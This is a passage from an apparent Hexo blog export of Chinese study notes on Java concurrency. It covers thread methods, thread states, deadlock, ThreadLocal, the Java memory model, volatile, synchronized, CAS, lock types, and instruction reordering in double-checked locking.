&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="3、常用方法"><a href="#3、常用方法" class="headerlink" title="3、常用方法"></a>3、常用方法</h1><h2 id="3-1、线程等待与通知"><a href="#3-1、线程等待与通知" class="headerlink" title="3.1、线程等待与通知"></a>3.1、线程等待与通知</h2><p>在Object类中有一些函数可以用于线程的等待与通知。</p>
<ul>
<li>wait()：当一个线程调用一个共享变量的 wait()方法时， 该调用线程会被阻塞挂起， 到发生下面几件事情之一才返回 ：（1）  线程调用了该共享对象 notify()或者 notifyAll()方法；（2）其他线程调用了该线程 interrupt()  方法，该线程抛出InterruptedException异常返回。</li>
<li>wait(long timeout) ：该方法相 wait()  方法多了一个超时参数，它的不同之处在于，如果一个线程调用共享对象的该方法挂起后，没有在指定的 timeout  ms时间内被其它线程调用该共享变量的notify()或者 notifyAll() 方法唤醒，那么该函数还是会因为超时而返回。</li>
<li>wait(long timeout, int nanos)，其内部调用的是 wait(long timout）函数。</li>
</ul>
<p>上面是线程等待的方法，而唤醒线程主要是下面两个方法：</p>
<ul>
<li>notify() :  一个线程调用共享对象的 notify() 方法后，会唤醒一个在该共享变量上调用 wait 系列方法后被挂起的线程。 一个共享变量上可能会有多个线程在等待，具体唤醒哪个等待的线程是随机的。</li>
<li>notifyAll() ：不同于在共享变量上调用 notify() 函数会唤醒被阻塞到该共享变量上的一个线程，notifyAll()方法则会唤醒所有在该共享变量上由于调用 wait 系列方法而被挂起的线程。</li>
</ul>
<p>如果有这样的场景，需要等待某几件事情完成后才能继续往下执行，比如多个线程加载资源，需要等待多个线程全部加载完毕再汇总处理。Thread类中有一个join方法可实现。</p>
<h2 id="3-2、线程休眠"><a href="#3-2、线程休眠" class="headerlink" title="3.2、线程休眠"></a>3.2、线程休眠</h2><p>Thread类中有一个静态态的 sleep 方法，当一个个执行中的线程调用了Thread  的sleep方法后，调用线程会暂时让出指定时间的执行权，也就是在这期间不参与 CPU  的调度，但是该线程所拥有的监视器资源，比如锁还是持有不让出的。指定的睡眠时间到了后该函数会正常返回，线程就处于就绪状态，然后参与 CPU  的调度，获取到 CPU 资源后就可以继续运行。</p>
<h2 id="3-3、让出优先权"><a href="#3-3、让出优先权" class="headerlink" title="3.3、让出优先权"></a>3.3、让出优先权</h2><p>Thread 有一个静态 yield 方法，当一个线程调用 yield 方法时，实际就是在暗示线程调度器当前线程请求让出自己的CPU 使用，但是线程调度器可以无条件忽略这个暗示。</p>
<p>当一个线程调用 yield 方法时， 当前线程会让出 CPU 使用权，然后处于就绪状态，线程调度器会从线程就绪队列里面获取一个线程优先级最高的线程，当然也有可能会调度到刚刚让出 CPU 的那个线程来获取 CPU 行权。</p>
<h2 id="3-4、线程中断"><a href="#3-4、线程中断" class="headerlink" title="3.4、线程中断"></a>3.4、线程中断</h2><p>Java 中的线程中断是一种线程间的协作模式，通过设置线程的中断标志并不能直接终止该线程的执行，而是被中断的线程根据中断状态自行处理。</p>
<ul>
<li>void interrupt() ：中断线程，例如，当线程A运行时，线程B可以调用钱程interrupt() 方法来设置线程的中断标志为  true 并立即返回。设置标志仅仅是设置标志, 线程A实际并没有被中断， 会继续往下执行。如果线程A因为调用了wait() 系列函数、 join 方法或者 sleep 方法阻塞挂起，这时候若线程  B调用线程A的interrupt()方法，线程A会在调用这些方法的地方抛出InterruptedException异常而返回。</li>
<li>boolean isInterrupted() 方法： 检测当前线程是否被中断。</li>
<li>boolean interrupted() 方法： 检测当前线程是否被中断，与 isInterrupted 不同的是，该方法如果发现当前线程被中断，则会清除中断标志。</li>
</ul>
<h1 id="4、线程状态"><a href="#4、线程状态" class="headerlink" title="4、线程状态"></a>4、线程状态</h1><p>上面整理了线程的创建方式和一些常用方法，可以用线程的生命周期把这些方法串联起来。</p>
<p>在Java中，线程共有六种状态：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NEW</td>
<td>初始状态：线程被创建，但还没有调用start()方法</td>
</tr>
<tr>
<td>RUNNABLE</td>
<td>运行状态：Java线程将操作系统中的就绪和运行两种状态笼统的称作“运行”</td>
</tr>
<tr>
<td>BLOCKED</td>
<td>阻塞状态：表示线程阻塞于锁</td>
</tr>
<tr>
<td>WAITING</td>
<td>等待状态：表示线程进入等待状态，进入该状态表示当前线程需要等待其他线程做出一些特定动作（通知或中断）</td>
</tr>
<tr>
<td>TIME_WAITING</td>
<td>超时等待状态：该状态不同于 WAITIND，它是可以在指定的时间自行返回的</td>
</tr>
<tr>
<td>TERMINATED</td>
<td>终止状态：表示当前线程已经执行完毕</td>
</tr>
</tbody>
</table>
<p>线程在自身的生命周期中， 并不是固定地处于某个状态，而是随着代码的执行在不同的状态之间进行切换，Java线程状态变化如图示：</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/Java%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E5%8F%98%E5%8C%96.png" alt="Java线程状态变化"></p>
<h1 id="5、线程上下文切换"><a href="#5、线程上下文切换" class="headerlink" title="5、线程上下文切换"></a>5、线程上下文切换</h1><p>使用多线程的目的是为了充分利用CPU，但要认识到，每个CPU同一时刻只能被一个线程使用。</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/%E7%BA%BF%E7%A8%8B%E5%88%87%E6%8D%A2-2020-12-16-2107.png" alt="线程切换-2020-12-16-2107"></p>
<p>为了让用户感觉多个线程是在同时执行的， CPU 资源的分配采用了时间片轮转也就是给每个线程分配一个时间片，线程在时间片内占用 CPU 执行任务。当线程使用完时间片后，就会处于就绪状态并让出 CPU 让其他线程占用，这就是上下文切换。</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/image-20210202172806362.png" alt="image-20210202172806362"></p>
<h1 id="6、线程死锁"><a href="#6、线程死锁" class="headerlink" title="6、线程死锁"></a>6、线程死锁</h1><p>死锁是指两个或两个以上的线程在执行过程中，因争夺资源而造成的互相等待的现象，在无外力作用的情况下，这些线程会一直相互等待而无法继续运行下去。</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/image-20210202173326028.png" alt="image-20210202173326028"></p>
<p>那么为什么会产生死锁呢？ 死锁的产生必须具备以下四个条件：</p>
<ul>
<li>互斥条件：指线程对己经获取到的资源进行它性使用，即该资源同时只由一个线程占用。如果此时还有其它线程请求获取获取该资源，则请求者只能等待，直至占有资源的线程释放该资源。</li>
<li>请求并持有条件：指一个 线程己经持有了至少一个资源，但又提出了新的资源请求，而新资源己被其它线程占有，所以当前线程会被阻塞，但阻塞 的同时并不释放自己已经获取的资源。</li>
<li>不可剥夺条件：指线程获取到的资源在自己使用完之前不能被其它线程抢占，只有在自己使用完毕后才由自己释放该资源。</li>
<li>环路等待条件：指在发生死锁时，必然存在一个线程——资源的环形链，即线程集合 {T0，T1，T2,…… ，Tn} 中 T0 正在等待一 T1 占用的资源，Tl1正在等待 T2用的资源，…… Tn 在等待己被 T0占用的资源。</li>
</ul>
<p>该如何避免死锁呢？答案是<strong>至少破坏死锁发生的一个条件</strong>。</p>
<p>其中，互斥这个条件我们没有办法破坏，因为用锁为的就是互斥。不过其他三个条件都是有办法破坏掉的，到底如何做呢？</p>
<ul>
<li>对于“请求并持有”这个条件，可以一次性请求所有的资源。</li>
<li>对于“不可剥夺”这个条件，占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源，这样不可抢占这个条件就破坏掉了。</li>
<li>对于“环路等待”这个条件，可以靠按序申请资源来预防。所谓按序申请，是指资源是有线性顺序的，申请的时候可以先申请资源序号小的，再申请资源序号大的，这样线性化后就不存在环路了。</li>
</ul>
<h1 id="7、线程分类"><a href="#7、线程分类" class="headerlink" title="7、线程分类"></a>7、线程分类</h1><p>Java中的线程分为两类，分别为 <strong>daemon 线程（守护线程）</strong>和  <strong>user 线程（用户线程）</strong>。</p>
<p>在JVM 启动时会调用 main 函数，main函数所在的钱程就是一个用户线程。其实在 JVM 内部同时还启动了很多守护线程， 比如垃圾回收线程。</p>
<p>那么守护线程和用户线程有什么区别呢？区别之一是当最后一个非守护线程束时， JVM会正常退出，而不管当前是否存在守护线程，也就是说守护线程是否结束并不影响 JVM退出。换而言之，只要有一个用户线程还没结束，正常情况下JVM就不会退出。</p>
<h1 id="8、ThreadLocal"><a href="#8、ThreadLocal" class="headerlink" title="8、ThreadLocal"></a>8、ThreadLocal</h1><p>ThreadLocal是JDK 包提供的，它提供了线程本地变量，也就是如果你创建了ThreadLocal  ，那么访问这个变量的每个线程都会有这个变量的一个本地副本，当多个线程操作这个变量时，实际操作的是自己本地内存里面的变量，从而避免了线程安全问题。创建 ThreadLocal 变量后，每个线程都会复制 到自己的本地内存。</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/image-20210202182241538.png" alt="image-20210202182241538"></p>
<p>可以通过set(T)方法来设置一个值，在当前线程下再通过get()方法获取到原先设置的值。</p>
<p>下面来看一个ThreadLocal的使用实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadLocalTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建ThreadLocal变量</span></span><br><span class="line">    <span class="keyword">static</span> ThreadLocal&lt;String&gt; localVar = <span class="keyword">new</span> ThreadLocal&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印函数</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//打印当前线程本地内存中localVar变量值</span></span><br><span class="line">        System.out.println(str + <span class="string">":"</span> + localVar.get());</span><br><span class="line">        <span class="comment">//清除前线程本地内存中localVar变量值</span></span><br><span class="line">        <span class="comment">//localVar.remove();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Thread thread1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//设置线程1中本地变量localVal的值</span></span><br><span class="line">                localVar.set(<span class="string">"线程1的值"</span>);</span><br><span class="line">                <span class="comment">//调用打印函数</span></span><br><span class="line">                print(<span class="string">"线程1"</span>);</span><br><span class="line">                <span class="comment">//打印本地变量的值</span></span><br><span class="line">                System.out.println(<span class="string">"线程1打印本地变量后："</span> + localVar.get());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread thread2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">//设置线程2中本地变量localVal的值</span></span><br><span class="line">                localVar.set(<span class="string">"线程2的值"</span>);</span><br><span class="line">                <span class="comment">//调用打印函数</span></span><br><span class="line">                print(<span class="string">"线程2"</span>);</span><br><span class="line">                <span class="comment">//打印本地变量的值</span></span><br><span class="line">                System.out.println(<span class="string">"线程2打印本地变量后："</span> + localVar.get());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        thread1.start();</span><br><span class="line">        thread2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="9、Java内存模型"><a href="#9、Java内存模型" class="headerlink" title="9、Java内存模型"></a>9、Java内存模型</h1><p>在Java中，所有实例域、静态域和数组元素都存储在堆内存中，堆内存在线程之间共享 。</p>
<p>Java线程之间的通信由Java内存模型控制，Java内存模型决定一个线程对共享变量的写入何时对另一个线程可见。</p>
<p>从抽象的角度来看，Java内存模型定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（Main  Memory）中，每个线程都有一个私有的本地内存（Local  Memory），本地内存中存储了该线程以读/写共享变量的副本。本地内存是Java内存模型的  一个抽象概念，并不真实存在。它涵盖了缓存、写缓冲区、寄存器以及其他的硬件和编译器优化。</p>
<p>Java内存模型的抽象示意如图：</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/image-20210202194932184.png" alt="image-20210202194932184"></p>
<p>在实际实现中线程的工作内存如下图：</p>
<p><img src="https://gitee.com/sanfene/picgo/raw/master/image-20210202200333041.png" alt="image-20210202200333041"></p>
<h1 id="10、synchronized"><a href="#10、synchronized" class="headerlink" title="10、synchronized"></a>10、synchronized</h1><p>synchronized 块是 Java 提供的一种原子性内置锁， Java中的每个对象都可以把它当作同步锁来使用，这些 Java内置的使用者看不到的锁被称为内部锁，也作监视器锁。</p>
<p>线程的执行代码在进入 synchronized 代码块前会自动获取内部锁，这时候其他线程访问该同步代码块  被阻塞挂起。拿到内部锁的线程会在正常退出同步代码块或者抛出异常后或者在同步块调用了该内置锁资源  wait系列方法时释放该内置锁。内置锁是排它锁，就是当一个线程获取这个锁后，其他线程必须等待该线程释放锁后才能获取该锁。</p>
<blockquote>
<p>synchronized 的内存语义：这个内存语义就可以解决共享变量内存可见性问题，进入synchronized   块的内存语义是把在synchronized 块内使用到的变量从线程的工作内存中清除，这样在 synchronized  块内使用到该变量时就不会从线程的工作内存中获取，而是直接从主内存中获取。 退出 synchronized  块的内存语义是把在  synchronized  块内对共享变修改刷新到主内存。</p>
</blockquote>
<h1 id="11、volatile"><a href="#11、volatile" class="headerlink" title="11、volatile"></a>11、volatile</h1><p>上面介绍了使用锁的方式可以解决共享内存可见性问题，但是使用锁太笨重，因为它会带来线程上下文的切换开销，对于解决内存可见性问题， Java  还提供了volatile种弱形式的同步，也就是使用 volatile 关键字， 该关键字可以确保对一个变量的更新对其他线程马上<strong>可见</strong>。</p>
<p>当一个变量被声明为volatile时，线程在写入变量时不会把值缓存在寄存器或者其他地方，而是会把值刷新回主内存，当其它线程读取该共享变量，会从主内存重新获取最新值，而不是使用当前线程的工作内存中的值。</p>
<blockquote>
<p>volatile虽然提供了可见性保证，但并不保证操作的原子性。</p>
</blockquote>
<h1 id="12、Java-中的原子性操作"><a href="#12、Java-中的原子性操作" class="headerlink" title="12、Java 中的原子性操作"></a>12、Java 中的原子性操作</h1><p>所谓原子性操作，是指执行一系列操作时，这些操作要么全部执行，要么全部不执行，不存在只执行其中一部分的情况。</p>
<p>例如在设计计数器一般都先读取当前值，然后＋1，再更新。这个过程是读-改-写的过程，如果不能保证这个过程是原子性的，那么就会出现线程安问题。</p>
<p>那么如何才能保证多个操作的原子性呢？最简单的方法就是使用 synchronized 关键字进行同步。还可以用CAS操作。从Java 1.5开始，JDK的并发包里也提供了一些类来支持原子操作。</p>
<p>synchronized 是独占锁，没有获取内部锁的线程会被阻塞掉，大大降级了并发性。</p>
<h1 id="13、Java-中的-CAS-操作"><a href="#13、Java-中的-CAS-操作" class="headerlink" title="13、Java 中的 CAS 操作"></a>13、Java 中的 CAS 操作</h1><p>在Java中， 锁在并发处理中占据了一席之地，但是使用锁有有个不好的地方，就是当线程没有获取到锁时会被阻塞挂起，这会导致线程上下文的切换和重新调度开销。</p>
<p>Java 提供了非阻塞的 volatile 关键字来解决共享变量的可见性问题，这在一定程度上弥补了锁带来的开销问题，但是 volatile 只能保 共享变量可见性，不能解决读-改-写等的原子性问题。</p>
<p>CAS即 Compre and Swap ，其是 JDK 提供的非阻塞原子性操作，它通过硬件保证了<code>比较-更新</code>操作的原子性。JDK 里面的 Unsafe 类提供了一系列的compareAndSwap ＊方法，以 compareAndSwapLong 方法为例，看一下什么是CAS操作。</p>
<ul>
<li>boolean compareAndSwapLong(Object obj,long valueOffset,long expect,  long update ）:  CAS 有四个操作数，分别为对象内存位置、 对象中 变量的偏移量、变量预期值和新的值 。其操作含义是：<strong>只有当对象 obj 中内存偏移量为 valueOffset 的变量预期值为 expect 的时候，才会将ecpect更新为update</strong>。 这是处理器提供的一个原子性指令。</li>
</ul>
<p>CAS有个经典的<strong>ABA问题</strong>。因为CAS需要在操作值的时候，检查值有没有发生变化，如果没有发生变化，则更新，但是如果一个值原来是A，变成了B，又变成了A，那么使用CAS进行检查时会发现它  的值没有发生变化，但是实际上却变化了。ABA问题的解决思路就是使用版本号。在变量前面追加上版本号，每次变量更新的时候把版本号加1，那么A→B→A就会变成1A→2B→3A。</p>
<h1 id="14、锁的概述"><a href="#14、锁的概述" class="headerlink" title="14、锁的概述"></a>14、锁的概述</h1><h2 id="14-1、乐观锁与悲观锁"><a href="#14-1、乐观锁与悲观锁" class="headerlink" title="14.1、乐观锁与悲观锁"></a>14.1、乐观锁与悲观锁</h2><p>乐观锁和悲观锁是在数据库中引入的名词，但是在并发包锁里面引入了类似的思想。</p>
<p>悲观锁指对数据被外界修改持保守态度，认为数据很容易就会被其他线程修改，所以在数据被处理前先对数据进行加锁，并在整个数据处理过程中，使数据处于锁定状态。悲观锁的实现往往依靠数据库提供的锁机制，即在数据 ，在对数据记录操作前给记录排它锁。如果获取锁失败， 则说明数据正在被其它线程修改，当前线程则等待或者抛出异常。  如果获取锁成功，则对记录进行操作 ，然后提交事务后释放排它锁。</p>
<p>乐观锁相对悲观锁来说的，它认为数据在一般情况下不会造成冲突，所以在访问记录前不会加排它锁，而在进行数据提交更新时，才会正式对数据冲 与否进行检测 。具体来说，根据 update 返回的行数让用户决定如何去做 。</p>
<h2 id="14-2、公平锁与非公平锁"><a href="#14-2、公平锁与非公平锁" class="headerlink" title="14.2、公平锁与非公平锁"></a>14.2、公平锁与非公平锁</h2><p>根据线程获取锁的抢占机制，锁可以分为公平锁和非公平锁，公平锁表示线程获取锁的顺序是按照线程请求锁的时间早晚来决定的，也就是最早请求锁的线程将最早获取到锁。</p>
<p>而非公平锁是在运行时闯入，也就是先来不一定先得。</p>
<p>ReentrantLock 提供了公平锁和非公平锁的实现：</p>
<ul>
<li>公平锁： ReentrantLock pairLock =new eentrantLock(true)</li>
<li>非公平锁： ReentrantLock pairLock =new ReentrantLock(false) 。 构造函数不传数，则默认是非公平锁。</li>
</ul>
<p>例如，假设线程A已经持有了锁，这时候线程B请求该锁其将被挂起  。当线程A释放锁后，假如当前有线程C也需要取该锁，如果采用非公平锁式，则根据线程调度策略  ，线程B和线程C两者之一可能获取锁，这时候不需要任何其他干涉，而如果使用公平锁则需要把C挂起，让B获取当前锁。</p>
<p>在没有公平性需求的前提下尽量使用非公平锁，因为公平锁会带来性能开销。</p>
<h2 id="14-3、独占锁与共享锁"><a href="#14-3、独占锁与共享锁" class="headerlink" title="14.3、独占锁与共享锁"></a>14.3、独占锁与共享锁</h2><p>根据锁只能被单个线程持有还是能被多个线程共同持有，锁可以分为独占锁和共享锁。</p>
<p>独占锁保证任何时候都只有一个线程能得到锁， ReentrantLock 就是以独占方式实现的。</p>
<p>共享锁则可以同时由多个线程持有 ，例如 ReadWriteLock读写锁，它允许一个资源可以被多线程同时进行读操作。</p>
<p>独占锁是一种悲观锁，共享锁是一种乐观锁。</p>
<h2 id="14-4、可重入锁"><a href="#14-4、可重入锁" class="headerlink" title="14.4、可重入锁"></a>14.4、可重入锁</h2><p>当一个线程要获取一个被其他线程持有的独占锁时，该线程会被阻塞。</p>
<p>那么当 一个线程再次获取它自己己经获取的锁时是否会被阻塞呢？如果不被阻塞，那么我们说该锁是可重入的，也就是只要该线程获取了该锁，那么可以无限次数（严格来说是有限次数）地进入被该锁锁住的代码。</p>
<h2 id="14-5、自旋锁"><a href="#14-5、自旋锁" class="headerlink" title="14.5、自旋锁"></a>14.5、自旋锁</h2><p>由于 Java 中的线程是与操作系统中的线程 一一对应的，所以当一个线程在获取锁（比如独占锁）失败后，会被切换到内核状态而被挂起  。当该线程获取到锁时又需要将其切换到内核状态而唤醒该线程。而从用户状态切换到内核状态的开销是比较大的，在一定程度上会影响并发性能。</p>
<p>自旋锁则是，当前线程在获取锁时，如果发现锁已经被其他线程占有，它不马上阻塞自己，在不放弃 CPU 使用权的情况下，多次尝试获取（默认次数是 10 ，可以使用 -XX:PreBlockSpinsh  参数设置该值），很有可能在后面几次尝试中其他线程己经释放了锁，如果尝试指定的次数后仍没有获取到锁则当前线程才会被阻塞挂起。由此看来自旋锁是使用  CPU 时间换取线程阻塞与调度的开销，但是很有可能这些 CPU 时间白白浪费了。</p>
<p><strong>参考：</strong></p>
<p>【1】：瞿陆续，薛宾田 编著 《并发编程之美》</p>
<p>【2】：极客时间 《Java并发编程实践》</p>
<p>【3】：方腾飞等编著《Java并发编程的艺术》</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>黑马程序员JMM学习笔记</title>
    <url>/Java/%E9%BB%91%E9%A9%AC%E7%A8%8B%E5%BA%8F%E5%91%98JMM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>本文是<a href="https://b23.tv/AYSxdj" target="_blank" rel="noopener"><strong>【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】</strong></a>教学视频学习所做的笔记</p>
<h2 id="四、什么是-JMM"><a href="#四、什么是-JMM" class="headerlink" title="四、什么是 JMM"></a>四、什么是 JMM</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Java内存模型 Java Memory Model ( JMM )</p>
<p>简单来说，JMM定义了一套在多线程读写共享内存时（成员变量、数组），对数据的可见性、有序性、原子性的规则和保障。</p>
<h3 id="1、原子性"><a href="#1、原子性" class="headerlink" title="1、原子性"></a>1、原子性</h3><p>所谓的原子性是指在一次操作或者多次操作中，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行，多个操作是一个不可以分割的整体。</p>
<p>问题：两个线程对初始值为0的静态变量操作：一个做自增，一个做自减，各做5000次，结果会是0吗？</p>
<p>代码：</p>
<p><img src="/images/java/JMM/原子性b.png" alt></p>
<p>结果：以上的结果可能是正数、负数、零。因为Java中对静态变量的自增自减并不是原子性操作。</p>
<p>看自增自减的字节码分析：</p>
<p><img src="/images/java/JMM/原子性c.png" alt></p>
<p>而Java 的内存模式如下图，完成静态变量的自增、自减操作需要在 “主内存” 和 “线程内存” 进行数据交换</p>
<p><img src="/images/java/JMM/原子性d.png" alt></p>
<p>如果是单线程，以上8行代码是顺序执行（不会交错）没有问题：</p>
<p><img src="/images/java/JMM/原子性e.png" alt></p>
<p>但多线程下，这8行代码可能会交错执行：</p>
<p><img src="/images/java/JMM/原子性f.png" alt></p>
<p>用synchronized关键字通过代码，进行原子性操作：</p>
<p><img src="/images/java/JMM/原子性g.png" alt></p>
<p>优化代码：</p>
<p><img src="/images/java/JMM/原子性i.png" alt></p>
<h3 id="2、可见性"><a href="#2、可见性" class="headerlink" title="2、可见性"></a>2、可见性</h3><p>看以下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">boolean</span> run = <span class="keyword">true</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">while</span> (run)&#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    t.start();</span><br><span class="line"></span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// 线程t不会如预想的停下来</span></span><br><span class="line">    run = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 线程 t 不会如预想的停下来，这就是由于线程的高速缓存内存导致了 <strong>可见性</strong> 问题，</p>
<blockquote>
<p>（注：这种模式在Android平台上线程t能停止，但这里分析的是非Android平台）</p>
</blockquote>
<p>分析以上代码：</p>
<p>初始状态，t 线程从 “主内存” 读取 <code>run</code> 的值到 “工作内存”。</p>
<p><img src="/images/java/JMM/可见性_1.png" alt></p>
<p>因为 t 线程要频繁的从主内存读取 <code>run</code> 的值，JIT编译器会将 <code>run</code> 的值缓存至“工作内存”中的高速缓存中，减少对主内存中 <code>run</code> 的访问，提高访问效率。</p>
<p><img src="/images/java/JMM/可见性_2.png" alt></p>
<p><code>Thread.sleep(1000);</code> 执行结束后，main线程修改  <code>run</code> 的值，并同步至主内存， 而 t 线程是从自己工作内存中的高速缓存中读取这个 <code>run</code> 的值，结果永远是旧值。</p>
<p><img src="/images/java/JMM/可见性_3.png" alt></p>
<p><strong>解决办法</strong>：给静态变量 <code>run</code> 加一个关键字 <code>volatile</code> 修饰。</p>
<p><strong>总结</strong>：以上是一个可见性的问题。</p>
<p>volatile 可以用来修饰 <strong>成员变量 和 静态成员变量</strong>，可以避免线程从自己的工作缓存中查找变量的值，必须到<strong>主内存</strong>中获取变量的值，线程操作 “volatile 变量” 都是直接操作“主内存”。</p>
<p><strong>volatile 可见性</strong> 的特性是指在多个线程之间，保证一个线程对 volatile 变量的修改对另外一个线程可见。</p>
<blockquote>
<p>volatile 不能保证原子性，仅用在“一个线程” <strong>写</strong>，“多个线程” <strong>读</strong> 的情况。</p>
</blockquote>
<p>synchronized 语句块即可保证代码块的<strong>原子性</strong> ，也同时保证代码块内的变量 <strong>可见性</strong> 。但缺点是他是重量级操作，性能相对更低。</p>
<p>看如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">boolean</span> run = <span class="keyword">true</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">    Thread t = <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">while</span> (run)&#123;</span><br><span class="line">            <span class="comment">// System.out.println() 内部使用了synchronized</span></span><br><span class="line">            <span class="comment">// 所以也可以保证对 run 的可见性</span></span><br><span class="line">            System.out.println(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    t.start();</span><br><span class="line"></span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// 线程t能停下来</span></span><br><span class="line">    run = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3、有序性"><a href="#3、有序性" class="headerlink" title="3、有序性"></a>3、有序性</h3><p>同一个线程内，JVM会在不影响正确性的情况下，调整语句执行的顺序，看如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> j;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在某线程内执行如下赋值操作</span></span><br><span class="line">i = ...;<span class="comment">//这是一个较为耗时操作</span></span><br><span class="line">j = ...;</span><br></pre></td></tr></table></figure>
<p>可以看到，i j 的赋值对结果不会产生影响。所以顺序可以是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i = ...;//这是一个较为耗时操作</span><br><span class="line">j = ...;</span><br></pre></td></tr></table></figure>
<p>也可以是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">j = ...;</span><br><span class="line">i = ...;//这是一个较为耗时操作</span><br></pre></td></tr></table></figure>
<p>这种特性称为 【指令重排】，多线程下【指令重排】会影响正确性，例如著名的 <code>double-checked locking</code>  模式实现单例。</p>
<p>看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton INSTANCE = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//示例没创建，才会进入内部的 synchronized 代码块</span></span><br><span class="line">        <span class="keyword">if</span>(INSTANCE == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 也许有其他线程已经创建了实例，所以在判断一次</span></span><br><span class="line">                <span class="keyword">if</span>(INSTANCE == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的特点是：</p>
<ul>
<li>懒惰实例化</li>
<li>首次使用 getInstance() 才使用 synchronized 加锁，后续使用时无需加锁。</li>
</ul>
<p>但在多线程下，这是有问题的，因为  INSTANCE = new Singleton(); 实例化会有【指令重排】问题。</p>
<p>new Singleton() 分析字节码：</p>
<p><img src="/images/java/JMM/有序性_1.png" alt></p>
<ul>
<li>4： 构造方法</li>
